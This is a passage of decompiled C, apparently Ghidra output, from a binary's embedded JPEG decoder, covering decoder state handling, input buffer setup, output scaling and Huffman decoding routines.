  for (local_18 = 0; local_18 < param_1[0x52]; local_18 = local_18 + 1) {
    iVar1 = *local_14;
    if (*(int *)(iVar1 + 0x4c) == 0) {
      iVar2 = *(int *)(iVar1 + 0x10);
      if (((iVar2 < 0) || (3 < iVar2)) || (param_1[iVar2 + 0x29] == 0)) {
        iVar3 = *param_1;
        *(undefined4 *)(iVar3 + 0x14) = 0x34;
        *(int *)(iVar3 + 0x18) = iVar2;
        (**(code **)*param_1)();
      }
      uVar4 = (**(code **)param_1[1])(param_1,1,0x84);
      FUN_00420fc8((char)param_1[iVar2 + 0x29],extraout_DL,extraout_CL,uVar4,param_1[iVar2 + 0x29],
                   0x84);
      *(undefined4 *)(iVar1 + 0x4c) = uVar4;
    }
    local_14 = local_14 + 1;
  }
  return;
}



void FUN_004239c4(int *param_1)

{
  FUN_004237a0(param_1);
  FUN_0042392c(param_1);
  (**(code **)param_1[0x6f])();
  (**(code **)param_1[0x6b])();
  *(undefined4 *)param_1[0x6d] = *(undefined4 *)(param_1[0x6b] + 4);
  return;
}



int FUN_00423a0c(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = param_1[0x6d];
  if (*(int *)(iVar1 + 0x14) == 0) {
    iVar2 = (**(code **)(param_1[0x6e] + 4))();
    if (iVar2 != 0) {
      if (iVar2 == 1) {
        if (*(int *)(iVar1 + 0x18) == 0) {
          if (*(int *)(iVar1 + 0x10) == 0) {
            *(undefined4 *)(*param_1 + 0x14) = 0x23;
            (**(code **)*param_1)();
          }
          FUN_004239c4(param_1);
        }
        else {
          FUN_004235d8(param_1);
          *(undefined4 *)(iVar1 + 0x18) = 0;
        }
      }
      else if (iVar2 == 2) {
        *(undefined4 *)(iVar1 + 0x14) = 1;
        if (*(int *)(iVar1 + 0x18) == 0) {
          if (param_1[0x24] < param_1[0x26]) {
            param_1[0x26] = param_1[0x24];
          }
        }
        else if (*(int *)(param_1[0x6e] + 0x10) != 0) {
          *(undefined4 *)(*param_1 + 0x14) = 0x3b;
          (**(code **)*param_1)();
        }
      }
    }
  }
  else {
    iVar2 = 2;
  }
  return iVar2;
}



void FUN_00423ab8(int *param_1)

{
  code **ppcVar1;
  
  ppcVar1 = (code **)param_1[0x6d];
  *ppcVar1 = FUN_00423a0c;
  ppcVar1[4] = (code *)0x0;
  ppcVar1[5] = (code *)0x0;
  ppcVar1[6] = (code *)0x1;
  (**(code **)(*param_1 + 0x10))();
  (**(code **)param_1[0x6e])();
  param_1[0x28] = 0;
  return;
}



void FUN_00423af4(int param_1)

{
  code **ppcVar1;
  
  ppcVar1 = (code **)(***(code ***)(param_1 + 4))(param_1,0,0x1c);
  *(code ***)(param_1 + 0x1b4) = ppcVar1;
  *ppcVar1 = FUN_00423a0c;
  ppcVar1[1] = FUN_00423ab8;
  ppcVar1[2] = FUN_004239c4;
  ppcVar1[3] = (code *)&LAB_004239fc;
  ppcVar1[4] = (code *)0x0;
  ppcVar1[5] = (code *)0x0;
  ppcVar1[6] = (code *)0x1;
  return;
}



undefined4 FUN_00423b48(int *param_1)

{
  undefined4 *puVar1;
  undefined *puVar2;
  int iVar3;
  undefined in_CL;
  
  puVar1 = (undefined4 *)param_1[6];
  iVar3 = FUN_00420fdc((char)puVar1[7],(char)puVar1[8],in_CL,puVar1[8],1,0x1000,puVar1[7]);
  if (iVar3 == 0) {
    if (puVar1[9] != 0) {
      *(undefined4 *)(*param_1 + 0x14) = 0x2a;
      (**(code **)*param_1)();
    }
    *(undefined4 *)(*param_1 + 0x14) = 0x78;
    (**(code **)(*param_1 + 4))(param_1,0xffffffff);
    puVar2 = (undefined *)puVar1[8];
    *puVar2 = 0xff;
    puVar2[1] = 0xd9;
    iVar3 = 2;
  }
  *puVar1 = puVar1[8];
  puVar1[1] = iVar3;
  puVar1[9] = 0;
  return 1;
}



void FUN_00423bb8(int *param_1,int param_2)

{
  int *piVar1;
  int iVar2;
  
  piVar1 = (int *)param_1[6];
  if (0 < param_2) {
    for (; iVar2 = piVar1[1], iVar2 < param_2; param_2 = param_2 - iVar2) {
      FUN_00423b48(param_1);
    }
    *piVar1 = *piVar1 + param_2;
    piVar1[1] = piVar1[1] - param_2;
  }
  return;
}



void FUN_00423be8(int param_1,undefined4 param_2)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 uVar3;
  
  if (*(int *)(param_1 + 0x18) == 0) {
    iVar2 = (***(code ***)(param_1 + 4))(param_1,0,0x28);
    *(int *)(param_1 + 0x18) = iVar2;
    uVar3 = (***(code ***)(param_1 + 4))(param_1,0,0x1000);
    *(undefined4 *)(iVar2 + 0x20) = uVar3;
  }
  puVar1 = *(undefined4 **)(param_1 + 0x18);
  puVar1[2] = &LAB_00423b3c;
  puVar1[3] = FUN_00423b48;
  puVar1[4] = FUN_00423bb8;
  puVar1[5] = FUN_0042d918;
  puVar1[6] = &DAT_00423be4;
  puVar1[7] = param_2;
  puVar1[1] = 0;
  *puVar1 = 0;
  return;
}



undefined4 FUN_00423c54(int *param_1)

{
  int *piVar1;
  int iVar2;
  undefined4 uVar3;
  
  if (param_1[5] == 0xca) {
    FUN_00424708(param_1);
    if (param_1[0x10] != 0) {
      param_1[5] = 0xcf;
      return 1;
    }
    param_1[5] = 0xcb;
  }
  if (param_1[5] == 0xcb) {
    if (*(int *)(param_1[0x6d] + 0x10) != 0) {
      while( true ) {
        if (param_1[2] != 0) {
          (**(code **)param_1[2])();
        }
        iVar2 = (**(code **)param_1[0x6d])();
        if (iVar2 == 0) {
          return 0;
        }
        if (iVar2 == 2) break;
        if ((param_1[2] != 0) && ((iVar2 == 3 || (iVar2 == 1)))) {
          iVar2 = param_1[2];
          piVar1 = (int *)(iVar2 + 4);
          *piVar1 = *piVar1 + 1;
          if (*(int *)(param_1[2] + 8) <= *(int *)(iVar2 + 4)) {
            piVar1 = (int *)(param_1[2] + 8);
            *piVar1 = *piVar1 + param_1[0x50];
          }
        }
      }
    }
    param_1[0x26] = param_1[0x24];
  }
  else if (param_1[5] != 0xcc) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x14;
    *(int *)(iVar2 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  uVar3 = FUN_00423d1c((int)param_1);
  return uVar3;
}



undefined4 FUN_00423d1c(int param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  if (*(int *)(param_1 + 0x14) != 0xcc) {
    (***(code ***)(param_1 + 0x1a4))();
    *(undefined4 *)(param_1 + 0x8c) = 0;
    *(undefined4 *)(param_1 + 0x14) = 0xcc;
  }
  do {
    if (*(int *)(*(int *)(param_1 + 0x1a4) + 8) == 0) {
      if (*(int *)(param_1 + 0x44) == 0) {
        uVar2 = 0xcd;
      }
      else {
        uVar2 = 0xce;
      }
      *(undefined4 *)(param_1 + 0x14) = uVar2;
      return 1;
    }
    while (*(uint *)(param_1 + 0x8c) < *(uint *)(param_1 + 0x74)) {
      iVar1 = *(int *)(param_1 + 8);
      if (iVar1 != 0) {
        *(uint *)(iVar1 + 4) = *(uint *)(param_1 + 0x8c);
        *(undefined4 *)(iVar1 + 8) = *(undefined4 *)(param_1 + 0x74);
        (***(code ***)(param_1 + 8))();
      }
      iVar1 = *(int *)(param_1 + 0x8c);
      (**(code **)(*(int *)(param_1 + 0x1a8) + 4))(param_1,0,param_1 + 0x8c,0);
      if (iVar1 == *(int *)(param_1 + 0x8c)) {
        return 0;
      }
    }
    (**(code **)(*(int *)(param_1 + 0x1a4) + 4))();
    (***(code ***)(param_1 + 0x1a4))();
    *(undefined4 *)(param_1 + 0x8c) = 0;
  } while( true );
}



int FUN_00423ddc(int *param_1,undefined4 param_2,int param_3)

{
  int iVar1;
  int local_10;
  
  local_10 = param_3;
  if (param_1[5] != 0xcd) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if ((uint)param_1[0x23] < (uint)param_1[0x1d]) {
    iVar1 = param_1[2];
    if (iVar1 != 0) {
      *(int *)(iVar1 + 4) = param_1[0x23];
      *(int *)(iVar1 + 8) = param_1[0x1d];
      (**(code **)param_1[2])();
    }
    local_10 = 0;
    (**(code **)(param_1[0x6a] + 4))(param_1,param_2,&local_10);
    param_1[0x23] = param_1[0x23] + param_3;
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 0x7b;
    (**(code **)(*param_1 + 4))(param_1,0xffffffff);
    param_3 = 0;
  }
  return param_3;
}



uint FUN_00423e6c(int *param_1,undefined4 param_2,uint param_3)

{
  uint uVar1;
  int iVar2;
  
  if (param_1[5] != 0xce) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x14;
    *(int *)(iVar2 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if ((uint)param_1[0x23] < (uint)param_1[0x1d]) {
    iVar2 = param_1[2];
    if (iVar2 != 0) {
      *(int *)(iVar2 + 4) = param_1[0x23];
      *(int *)(iVar2 + 8) = param_1[0x1d];
      (**(code **)param_1[2])();
    }
    uVar1 = param_1[0x4e] * param_1[0x4f];
    if (param_3 <= uVar1 && uVar1 - param_3 != 0) {
      *(undefined4 *)(*param_1 + 0x14) = 0x17;
      (**(code **)*param_1)();
    }
    iVar2 = (**(code **)(param_1[0x6b] + 0xc))(param_1,param_2);
    if (iVar2 == 0) {
      uVar1 = 0;
    }
    else {
      param_1[0x23] = param_1[0x23] + uVar1;
    }
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 0x7b;
    (**(code **)(*param_1 + 4))(param_1,0xffffffff);
    uVar1 = 0;
  }
  return uVar1;
}



void FUN_00423f18(int *param_1,int param_2)

{
  int iVar1;
  
  if ((param_1[5] != 0xcf) && (param_1[5] != 0xcc)) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if (param_2 < 1) {
    param_2 = 1;
  }
  if ((*(int *)(param_1[0x6d] + 0x14) != 0) && (param_1[0x24] < param_2)) {
    param_2 = param_1[0x24];
  }
  param_1[0x26] = param_2;
  FUN_00423d1c((int)param_1);
  return;
}



undefined4 FUN_00423f78(int *param_1)

{
  int iVar1;
  
  if (((param_1[5] == 0xcd) || (param_1[5] == 0xce)) && (param_1[0x10] != 0)) {
    (**(code **)(param_1[0x69] + 4))();
    param_1[5] = 0xd0;
  }
  else if (param_1[5] != 0xd0) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  while ((param_1[0x24] <= param_1[0x26] && (*(int *)(param_1[0x6d] + 0x14) == 0))) {
    iVar1 = (**(code **)param_1[0x6d])();
    if (iVar1 == 0) {
      return 0;
    }
  }
  param_1[5] = 0xcf;
  return 1;
}



undefined4 FUN_00424000(int param_1)

{
  int iVar1;
  int iVar2;
  
  if ((*(int *)(param_1 + 0x4c) != 0) || (*(int *)(param_1 + 300) != 0)) {
    return 0;
  }
  if ((*(int *)(param_1 + 0x28) == 3) &&
     (((*(int *)(param_1 + 0x24) == 3 && (*(int *)(param_1 + 0x2c) == 2)) &&
      (*(int *)(param_1 + 0x78) == 3)))) {
    iVar1 = *(int *)(param_1 + 0xd8);
    if (((((*(int *)(iVar1 + 8) == 2) && (*(int *)(iVar1 + 0x5c) == 1)) &&
         (*(int *)(iVar1 + 0xb0) == 1)) &&
        ((*(int *)(iVar1 + 0xc) < 3 && (*(int *)(iVar1 + 0x60) == 1)))) &&
       (*(int *)(iVar1 + 0xb4) == 1)) {
      iVar1 = *(int *)(param_1 + 0xd8);
      iVar2 = *(int *)(param_1 + 0x13c);
      if (((*(int *)(iVar1 + 0x24) == iVar2) && (iVar2 == *(int *)(iVar1 + 0x78))) &&
         (iVar2 == *(int *)(iVar1 + 0xcc))) {
        return 1;
      }
      return 0;
    }
    return 0;
  }
  return 0;
}



void FUN_00424090(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  if (param_1[5] != 0xca) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if ((uint)(param_1[0xc] << 3) < (uint)param_1[0xd] || param_1[0xc] << 3 == param_1[0xd]) {
    iVar1 = FUN_0042dba8(param_1[7],8);
    param_1[0x1c] = iVar1;
    iVar1 = FUN_0042dba8(param_1[8],8);
    param_1[0x1d] = iVar1;
    param_1[0x4f] = 1;
  }
  else if ((uint)(param_1[0xc] << 2) < (uint)param_1[0xd] || param_1[0xc] << 2 == param_1[0xd]) {
    iVar1 = FUN_0042dba8(param_1[7],4);
    param_1[0x1c] = iVar1;
    iVar1 = FUN_0042dba8(param_1[8],4);
    param_1[0x1d] = iVar1;
    param_1[0x4f] = 2;
  }
  else if ((uint)(param_1[0xc] * 2) < (uint)param_1[0xd] || param_1[0xc] * 2 == param_1[0xd]) {
    iVar1 = FUN_0042dba8(param_1[7],2);
    param_1[0x1c] = iVar1;
    iVar1 = FUN_0042dba8(param_1[8],2);
    param_1[0x1d] = iVar1;
    param_1[0x4f] = 4;
  }
  else {
    param_1[0x1c] = param_1[7];
    param_1[0x1d] = param_1[8];
    param_1[0x4f] = 8;
  }
  iVar1 = param_1[0x36];
  for (iVar3 = 0; iVar3 < param_1[9]; iVar3 = iVar3 + 1) {
    for (iVar2 = param_1[0x4f];
        ((iVar2 < 8 && (*(int *)(iVar1 + 8) * iVar2 * 2 <= param_1[0x4d] * param_1[0x4f])) &&
        (*(int *)(iVar1 + 0xc) * iVar2 * 2 <= param_1[0x4e] * param_1[0x4f])); iVar2 = iVar2 * 2) {
    }
    *(int *)(iVar1 + 0x24) = iVar2;
    iVar1 = iVar1 + 0x54;
  }
  iVar1 = param_1[0x36];
  for (iVar3 = 0; iVar3 < param_1[9]; iVar3 = iVar3 + 1) {
    iVar2 = FUN_0042dba8(*(int *)(iVar1 + 8) * *(int *)(iVar1 + 0x24) * param_1[7],
                         param_1[0x4d] << 3);
    *(int *)(iVar1 + 0x28) = iVar2;
    iVar2 = FUN_0042dba8(*(int *)(iVar1 + 0xc) * *(int *)(iVar1 + 0x24) * param_1[8],
                         param_1[0x4e] << 3);
    *(int *)(iVar1 + 0x2c) = iVar2;
    iVar1 = iVar1 + 0x54;
  }
  iVar1 = param_1[0xb];
  if (iVar1 == 1) {
    param_1[0x1e] = 1;
  }
  else if (iVar1 - 2U < 2) {
    param_1[0x1e] = 3;
  }
  else if (iVar1 - 4U < 2) {
    param_1[0x1e] = 4;
  }
  else {
    param_1[0x1e] = param_1[9];
  }
  if (param_1[0x15] == 0) {
    iVar1 = param_1[0x1e];
  }
  else {
    iVar1 = 1;
  }
  param_1[0x1f] = iVar1;
  iVar1 = FUN_00424000((int)param_1);
  if (iVar1 == 0) {
    param_1[0x20] = 1;
  }
  else {
    param_1[0x20] = param_1[0x4e];
  }
  return;
}



void FUN_0042427c(int param_1)

{
  int iVar1;
  int iVar2;
  undefined extraout_CL;
  undefined extraout_CL_00;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined *puVar3;
  
  iVar1 = (***(code ***)(param_1 + 4))(param_1,1,0x580);
  puVar3 = (undefined *)(iVar1 + 0x100);
  *(undefined **)(param_1 + 0x144) = puVar3;
  FUN_00420fb0((char)iVar1,extraout_DL,extraout_CL,iVar1,0,0x100);
  iVar2 = 0;
  do {
    *puVar3 = (char)iVar2;
    iVar2 = iVar2 + 1;
    puVar3 = puVar3 + 1;
  } while (iVar2 < 0x100);
  iVar2 = 0x80;
  puVar3 = (undefined *)(iVar1 + 0x200);
  do {
    *puVar3 = 0xff;
    iVar2 = iVar2 + 1;
    puVar3 = puVar3 + 1;
  } while (iVar2 < 0x200);
  FUN_00420fb0((char)iVar2,(char)puVar3,(char)(iVar1 + 0x380),iVar1 + 0x380,0,0x180);
  FUN_00420fc8((char)*(undefined4 *)(param_1 + 0x144),extraout_DL_00,extraout_CL_00,iVar1 + 0x500,
               *(undefined4 *)(param_1 + 0x144),0x80);
  return;
}



// WARNING: Removing unreachable block (ram,0x0042433c)

void FUN_00424318(int *param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_ECX_01;
  undefined4 extraout_ECX_02;
  int extraout_EDX;
  int iVar4;
  int extraout_EDX_00;
  
  iVar1 = param_1[0x69];
  FUN_00424090(param_1);
  FUN_0042427c((int)param_1);
  *(undefined4 *)(iVar1 + 0xc) = 0;
  uVar3 = FUN_00424000((int)param_1);
  *(undefined4 *)(iVar1 + 0x10) = uVar3;
  *(undefined4 *)(iVar1 + 0x14) = 0;
  *(undefined4 *)(iVar1 + 0x18) = 0;
  if ((param_1[0x15] == 0) || (param_1[0x10] == 0)) {
    param_1[0x19] = 0;
    param_1[0x1a] = 0;
    param_1[0x1b] = 0;
  }
  iVar4 = 0;
  uVar3 = 0;
  if (param_1[0x15] != 0) {
    if (param_1[0x11] != 0) {
      *(undefined4 *)(*param_1 + 0x14) = 0x2f;
      (**(code **)*param_1)();
      uVar3 = extraout_ECX;
      iVar4 = extraout_EDX;
    }
    if (param_1[0x1e] == 3) {
      if (param_1[0x22] == 0) {
        if (param_1[0x17] == 0) {
          param_1[0x19] = 1;
        }
        else {
          param_1[0x1b] = 1;
        }
      }
      else {
        param_1[0x1a] = 1;
      }
    }
    else {
      param_1[0x19] = 1;
      uVar3 = 0;
      param_1[0x1a] = 0;
      param_1[0x1b] = 0;
      iVar4 = 0;
      param_1[0x22] = 0;
    }
    if (param_1[0x19] != 0) {
      FUN_0042773c(param_1);
      iVar4 = param_1[0x73];
      *(int *)(iVar1 + 0x14) = iVar4;
      uVar3 = extraout_ECX_00;
    }
    if ((param_1[0x1b] != 0) || (param_1[0x1a] != 0)) {
      FUN_004289b0(param_1);
      iVar4 = param_1[0x73];
      *(int *)(iVar1 + 0x18) = iVar4;
      uVar3 = extraout_ECX_01;
    }
  }
  if (param_1[0x11] == 0) {
    if (*(int *)(iVar1 + 0x10) == 0) {
      FUN_004269bc(param_1);
      FUN_0042ace0(param_1);
    }
    else {
      FUN_00426560((int)param_1);
    }
    FUN_0042a498((int)param_1,param_1[0x1b]);
    uVar3 = extraout_ECX_02;
    iVar4 = extraout_EDX_00;
  }
  FUN_0042a780((int)param_1,iVar4,uVar3);
  if (param_1[0x38] == 0) {
    if (param_1[0x37] == 0) {
      FUN_00425fb4((int)param_1);
    }
    else {
      FUN_004253f4((int)param_1);
    }
  }
  else {
    *(undefined4 *)(*param_1 + 0x14) = 1;
    (**(code **)*param_1)();
  }
  if ((*(int *)(param_1[0x6d] + 0x10) == 0) && (param_1[0x10] == 0)) {
    iVar4 = 0;
  }
  else {
    iVar4 = 1;
  }
  FUN_0042a124((int)param_1,iVar4);
  if (param_1[0x11] == 0) {
    FUN_004290c8(param_1,0);
  }
  (**(code **)(param_1[1] + 0x18))();
  (**(code **)(param_1[0x6d] + 8))();
  if (((param_1[2] != 0) && (param_1[0x10] == 0)) && (*(int *)(param_1[0x6d] + 0x10) != 0)) {
    if (param_1[0x37] == 0) {
      iVar4 = param_1[9];
    }
    else {
      iVar4 = param_1[9] * 3 + 2;
    }
    iVar2 = param_1[2];
    *(undefined4 *)(iVar2 + 4) = 0;
    *(int *)(iVar2 + 8) = param_1[0x50] * iVar4;
    *(undefined4 *)(iVar2 + 0xc) = 0;
    if (param_1[0x1b] == 0) {
      uVar3 = 2;
    }
    else {
      uVar3 = 3;
    }
    *(undefined4 *)(param_1[2] + 0x10) = uVar3;
    *(int *)(iVar1 + 0xc) = *(int *)(iVar1 + 0xc) + 1;
  }
  return;
}



void FUN_0042452c(int *param_1)

{
  int iVar1;
  int iVar2;
  undefined4 uVar3;
  
  iVar1 = param_1[0x69];
  if (*(int *)(iVar1 + 8) == 0) {
    if ((param_1[0x15] != 0) && (param_1[0x22] == 0)) {
      if ((param_1[0x17] == 0) || (param_1[0x1b] == 0)) {
        if (param_1[0x19] == 0) {
          *(undefined4 *)(*param_1 + 0x14) = 0x2e;
          (**(code **)*param_1)();
        }
        else {
          param_1[0x73] = *(int *)(iVar1 + 0x14);
        }
      }
      else {
        param_1[0x73] = *(int *)(iVar1 + 0x18);
        *(undefined4 *)(iVar1 + 8) = 1;
      }
    }
    (**(code **)param_1[0x70])();
    (**(code **)(param_1[0x6b] + 8))();
    if (param_1[0x11] == 0) {
      if (*(int *)(iVar1 + 0x10) == 0) {
        (**(code **)param_1[0x72])();
      }
      (**(code **)param_1[0x71])();
      if (param_1[0x15] != 0) {
        (**(code **)param_1[0x73])(param_1,*(undefined4 *)(iVar1 + 8));
      }
      if (*(int *)(iVar1 + 8) == 0) {
        uVar3 = 0;
      }
      else {
        uVar3 = 3;
      }
      (**(code **)param_1[0x6c])(param_1,uVar3);
      (**(code **)param_1[0x6a])(param_1,0);
    }
  }
  else {
    *(undefined4 *)(iVar1 + 8) = 0;
    (**(code **)param_1[0x73])(param_1,0);
    (**(code **)param_1[0x6c])(param_1,2);
    (**(code **)param_1[0x6a])(param_1,2);
  }
  if (param_1[2] != 0) {
    *(undefined4 *)(param_1[2] + 0xc) = *(undefined4 *)(iVar1 + 0xc);
    if (*(int *)(iVar1 + 8) == 0) {
      iVar2 = 1;
    }
    else {
      iVar2 = 2;
    }
    *(int *)(param_1[2] + 0x10) = iVar2 + *(int *)(iVar1 + 0xc);
    if ((param_1[0x10] != 0) && (*(int *)(param_1[0x6d] + 0x14) == 0)) {
      if (param_1[0x1b] == 0) {
        iVar1 = 1;
      }
      else {
        iVar1 = 2;
      }
      *(int *)(param_1[2] + 0x10) = *(int *)(param_1[2] + 0x10) + iVar1;
    }
  }
  return;
}



void FUN_0042469c(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar1 = param_1[0x69];
  if (param_1[5] != 0xcf) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x14;
    *(int *)(iVar2 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  if (((param_1[0x15] != 0) && (param_1[0x1a] != 0)) && (param_1[0x22] != 0)) {
    param_1[0x73] = *(int *)(iVar1 + 0x18);
    (**(code **)(param_1[0x73] + 0xc))();
    *(undefined4 *)(iVar1 + 8) = 0;
    return;
  }
  *(undefined4 *)(*param_1 + 0x14) = 0x2e;
  (**(code **)*param_1)();
  return;
}



void FUN_00424708(int *param_1)

{
  code **ppcVar1;
  
  ppcVar1 = (code **)(**(code **)param_1[1])(param_1,1,0x1c);
  param_1[0x69] = (int)ppcVar1;
  *ppcVar1 = FUN_0042452c;
  ppcVar1[1] = (code *)&LAB_00424680;
  ppcVar1[2] = (code *)0x0;
  FUN_00424318(param_1);
  return;
}



void FUN_00424740(int *param_1)

{
  int iVar1;
  int iVar2;
  bool bVar3;
  int iVar4;
  int *piVar5;
  int iVar6;
  bool bVar7;
  int local_20;
  int *local_18;
  undefined4 *local_14;
  
  bVar7 = param_1[100] != 0;
  iVar1 = param_1[0x6f];
  bVar3 = false;
  if (bVar7) {
    if ((param_1[0x65] < param_1[100]) || (0x3f < param_1[0x65])) {
      bVar3 = true;
    }
    if (param_1[0x52] != 1) {
      bVar3 = true;
    }
  }
  else if (param_1[0x65] != 0) {
    bVar3 = true;
  }
  if ((param_1[0x66] != 0) && (param_1[0x66] + -1 != param_1[0x67])) {
    bVar3 = true;
  }
  if (0xd < param_1[0x67]) {
    bVar3 = true;
  }
  if (bVar3) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x10;
    *(int *)(iVar2 + 0x18) = param_1[100];
    *(int *)(iVar2 + 0x1c) = param_1[0x65];
    *(int *)(iVar2 + 0x20) = param_1[0x66];
    *(int *)(iVar2 + 0x24) = param_1[0x67];
    (**(code **)*param_1)();
  }
  local_18 = param_1 + 0x53;
  for (local_20 = 0; local_20 < param_1[0x52]; local_20 = local_20 + 1) {
    iVar2 = *(int *)(*local_18 + 4);
    piVar5 = (int *)(iVar2 * 0x100 + param_1[0x28]);
    if ((bVar7) && (*piVar5 < 0)) {
      iVar6 = *param_1;
      *(undefined4 *)(iVar6 + 0x14) = 0x73;
      *(int *)(iVar6 + 0x18) = iVar2;
      *(undefined4 *)(iVar6 + 0x1c) = 0;
      (**(code **)(*param_1 + 4))(param_1,0xffffffff);
    }
    iVar6 = param_1[100];
    piVar5 = piVar5 + iVar6;
    for (; iVar6 <= param_1[0x65]; iVar6 = iVar6 + 1) {
      if (*piVar5 < 0) {
        iVar4 = 0;
      }
      else {
        iVar4 = *piVar5;
      }
      if (iVar4 != param_1[0x66]) {
        iVar4 = *param_1;
        *(undefined4 *)(iVar4 + 0x14) = 0x73;
        *(int *)(iVar4 + 0x18) = iVar2;
        *(int *)(iVar4 + 0x1c) = iVar6;
        (**(code **)(*param_1 + 4))(param_1,0xffffffff);
      }
      *piVar5 = param_1[0x67];
      piVar5 = piVar5 + 1;
    }
    local_18 = local_18 + 1;
  }
  if (param_1[0x66] == 0) {
    if (bVar7) {
      *(code **)(iVar1 + 4) = FUN_00424c44;
    }
    else {
      *(code **)(iVar1 + 4) = FUN_00424a08;
    }
  }
  else if (bVar7) {
    *(code **)(iVar1 + 4) = FUN_00424fc8;
  }
  else {
    *(code **)(iVar1 + 4) = FUN_00424ed0;
  }
  local_14 = (undefined4 *)(iVar1 + 0x18);
  piVar5 = param_1 + 0x53;
  for (local_20 = 0; local_20 < param_1[0x52]; local_20 = local_20 + 1) {
    if (bVar7) {
      iVar2 = *(int *)(*piVar5 + 0x18);
      FUN_004255a0(param_1,0,iVar2,(int *)(iVar1 + 0x2c + iVar2 * 4));
      *(undefined4 *)(iVar1 + 0x3c) = *(undefined4 *)(iVar1 + 0x2c + iVar2 * 4);
    }
    else if (param_1[0x66] == 0) {
      iVar2 = *(int *)(*piVar5 + 0x14);
      FUN_004255a0(param_1,1,iVar2,(int *)(iVar1 + 0x2c + iVar2 * 4));
    }
    *local_14 = 0;
    local_14 = local_14 + 1;
    piVar5 = piVar5 + 1;
  }
  *(undefined4 *)(iVar1 + 0x10) = 0;
  *(undefined4 *)(iVar1 + 0xc) = 0;
  *(undefined4 *)(iVar1 + 8) = 0;
  *(undefined4 *)(iVar1 + 0x14) = 0;
  *(int *)(iVar1 + 0x28) = param_1[0x45];
  return;
}



undefined4 FUN_00424994(int param_1)

{
  int *piVar1;
  int iVar2;
  int iVar3;
  undefined4 *puVar4;
  
  iVar2 = *(int *)(param_1 + 0x1bc);
  iVar3 = *(int *)(iVar2 + 0x10);
  if (iVar3 < 0) {
    iVar3 = iVar3 + 7;
  }
  piVar1 = (int *)(*(int *)(param_1 + 0x1b8) + 0x18);
  *piVar1 = *piVar1 + (iVar3 >> 3);
  *(undefined4 *)(iVar2 + 0x10) = 0;
  iVar3 = (**(code **)(*(int *)(param_1 + 0x1b8) + 8))();
  if (iVar3 == 0) {
    return 0;
  }
  puVar4 = (undefined4 *)(iVar2 + 0x18);
  for (iVar3 = 0; iVar3 < *(int *)(param_1 + 0x148); iVar3 = iVar3 + 1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined4 *)(iVar2 + 0x14) = 0;
  *(undefined4 *)(iVar2 + 0x28) = *(undefined4 *)(param_1 + 0x114);
  if (*(int *)(param_1 + 0x1a0) == 0) {
    *(undefined4 *)(iVar2 + 8) = 0;
  }
  return 1;
}



undefined4 FUN_00424a08(int param_1,short **param_2)

{
  int iVar1;
  short *psVar2;
  byte **ppbVar3;
  int iVar4;
  undefined4 uVar5;
  int iVar6;
  uint uVar7;
  int iVar8;
  uint uVar9;
  byte *pbVar10;
  undefined4 *puVar11;
  byte *pbVar12;
  undefined4 *puVar13;
  byte bVar14;
  int local_54;
  int local_44;
  short **local_40;
  int *local_3c;
  byte *local_38;
  byte *local_34;
  byte *local_30;
  byte *local_2c;
  int local_28;
  undefined4 local_24;
  int aiStack32 [4];
  
  bVar14 = 0;
  iVar1 = *(int *)(param_1 + 0x1bc);
  uVar5 = *(undefined4 *)(param_1 + 0x19c);
  if (((*(int *)(param_1 + 0x114) == 0) || (*(int *)(iVar1 + 0x28) != 0)) ||
     (iVar4 = FUN_00424994(param_1), iVar4 != 0)) {
    if (*(int *)(iVar1 + 8) == 0) {
      local_38 = **(byte ***)(param_1 + 0x18);
      local_3c = (int *)(param_1 + 0x168);
      local_34 = (*(byte ***)(param_1 + 0x18))[1];
      pbVar12 = *(byte **)(iVar1 + 0xc);
      pbVar10 = *(byte **)(iVar1 + 0x10);
      puVar11 = (undefined4 *)(iVar1 + 0x14);
      puVar13 = &local_24;
      for (iVar4 = 5; iVar4 != 0; iVar4 = iVar4 + -1) {
        *puVar13 = *puVar11;
        puVar11 = puVar11 + (uint)bVar14 * -2 + 1;
        puVar13 = puVar13 + (uint)bVar14 * -2 + 1;
      }
      local_40 = param_2;
      local_28 = param_1;
      for (local_54 = 0; local_54 < *(int *)(param_1 + 0x164); local_54 = local_54 + 1) {
        psVar2 = *local_40;
        iVar4 = *local_3c;
        iVar8 = *(int *)(iVar1 + 0x2c + *(int *)(*(int *)(param_1 + 0x14c + iVar4 * 4) + 0x14) * 4);
        if ((int)pbVar10 < 8) {
          iVar6 = FUN_0042589c(&local_38,pbVar12,pbVar10,0);
          if (iVar6 == 0) {
            return 0;
          }
          pbVar10 = local_2c;
          pbVar12 = local_30;
          if (7 < (int)local_2c) goto LAB_00424b0a;
          local_44 = 1;
LAB_00424b44:
          uVar7 = FUN_004259e8(&local_38,pbVar12,pbVar10,local_44,iVar8);
